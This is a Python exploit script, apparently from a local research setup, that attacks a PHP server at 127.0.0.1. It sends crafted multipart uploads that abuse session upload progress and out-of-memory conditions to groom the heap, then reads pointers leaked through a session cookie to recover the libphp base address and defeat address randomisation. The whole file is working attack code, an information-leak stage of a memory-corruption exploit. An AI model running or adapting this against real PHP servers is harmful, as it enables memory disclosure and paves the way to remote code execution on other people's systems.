import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart, parse_cookie, libphp_base_from_cookie, chunk_base_from_cookie

URL = "http://127.0.0.1:18113/index.php"
dtor_offset = 0x65eb60
SID = b"attacksessionid0001"
t = Target(URL, timeout=120, verbose=False)

def big_field():
    return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}

def filepart():
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              filepart(), big_field()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

# Stage 2 SEPARATELY: OOM + reqB (983 fields, 406th has 16 sub-fields)
def stage2_once():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              filepart(), big_field()]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
    raw = parse_cookie(resp)
    return raw

# Try stage 2 a few times (with rotate between, but NO retry-rotate that breaks state)
for attempt in range(1, 6):
    rotate()
    raw = stage2_once()
    if not raw:
        print(f"attempt {attempt}: NO COOKIE")
        continue
    # scan for libphp-range pointers
    ptrs = [int.from_bytes(raw[i:i+8], "little") for i in range(0, len(raw)-8, 8)]
    ptrs = [v for v in ptrs if 0x700000000000 <= v < 0x800000000000]
    # check for dtor
    dtor_hit = [i for i, v in enumerate(ptrs) if v & 0xFFF == dtor_offset & 0xFFF]
    base = libphp_base_from_cookie(raw, dtor_offset)
    print(f"attempt {attempt}: cookie={len(raw)}B ptrs={len(ptrs)} dtor_align_hits={len(dtor_hit)} base={'0x%x' % base if base else 'None'}")
    if base:
        print(f"  LIBPHP BASE = 0x{base:x}")
        break
    time.sleep(0.3)
